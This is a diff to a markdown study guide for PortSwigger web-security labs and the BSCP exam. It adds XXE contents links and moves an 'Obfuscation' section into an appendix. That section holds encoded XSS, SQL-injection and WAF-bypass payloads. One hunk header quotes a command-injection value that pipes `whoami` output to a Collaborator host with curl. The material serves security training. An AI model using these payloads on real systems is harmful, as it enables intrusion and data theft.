@@ -1675,7 +1675,9 @@ X-Original-URL: /admin
 [DTD Blind Out-of-band](#dtd-blind-out-of-band)  
 [DTD Blind Error messages](#dtd-blind-error-messages)  
 [SQL + XML + HackVertor](#sql--xml--hackvertor)  
-[Obfuscation](#obfuscation)  
+[XXE perform SSRF](#xxe--ssrf)  
+[XXE with SVG upload](xxe-via-svg-image-upload)  
+
 
 >File upload or user import function on web target use XML file format. This can be vulnerable to XML external entity (XXE) injection.  
 
@@ -1809,51 +1811,6 @@ X-Original-URL: /admin
 
 [PortSwigger Lab: SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)  
   
-### Obfuscation  
-
->Obfuscation is the action of making something obscure, unclear, or unintelligible.  
-
->URL replacing the period character ```.``` with encoded value of ```%2e```.  
-
->Double-encode the injecting payload.  
-  
-```
-/?search=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
-```  
-
->HTML encode one or more of the characters  
-
-```html
-<img src=x onerror="&#x61;lert(1)">
-```  
-
->XML encode for bypassing WAFs  
-
-```xml
-<stockCheck>
-    <productId>
-        123
-    </productId>
-    <storeId>
-         999 &#x53;ELECT * FROM information_schema.tables
-    </storeId>
-</stockCheck>
-```
-
->Multiple encodings together  
-
-```html
-<a href="javascript:&bsol;u0061lert(1)">Click me</a>
-```  
-
->SQL CHAR  
-
-```sql
-CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
-```
-
-[Obfuscating attacks using encodings](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)
-
 ## SSRF - Server Side Request Forgery  
 
 [Absolute GET URL + HOST SSRF](#absolute-get-url--host-ssrf)  
@@ -2445,7 +2402,58 @@ email=carlos@exam.net||curl+`whoami`.COLLABORATOR.net||
  
 # Appendix  
 
->This section contain **additional** information to solving the PortSwigger labs and approaching the BSCP exam, such as the Youtube content creators, Burp speed scanning technique, python automated scripts I created by following [TJCHacking](https://www.youtube.com/@tjchacking/videos).  
+>This section contain **additional** information to solving the PortSwigger labs and approaching the BSCP exam, such as the Youtube content creators, Burp speed scanning technique, python scripts and [Obfuscation](#obfuscation) techniques to bypass filters.   
+
+[Obfuscation](#obfuscation)  
+[Python Scripts](#python-scripts)  
+[Focus Scanning](#focus-scanning)  
+[Approach](#approach)  
+[YouTube Channels](#youtube)  
+
+## Obfuscation  
+
+>Obfuscation is the action of making something obscure, unclear, or unintelligible.  
+
+>URL replacing the period character ```.``` with encoded value of ```%2e```.  
+
+>Double-encode the injecting payload.  
+  
+```
+/?search=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
+```  
+
+>HTML encode one or more of the characters  
+
+```html
+<img src=x onerror="&#x61;lert(1)">
+```  
+
+>XML encode for bypassing WAFs  
+
+```xml
+<stockCheck>
+    <productId>
+        123
+    </productId>
+    <storeId>
+         999 &#x53;ELECT * FROM information_schema.tables
+    </storeId>
+</stockCheck>
+```
+
+>Multiple encodings together  
+
+```html
+<a href="javascript:&bsol;u0061lert(1)">Click me</a>
+```  
+
+>SQL CHAR  
+
+```sql
+CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
+```
+
+[Obfuscating attacks using encodings](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)
 
 ## Python Scripts 
 
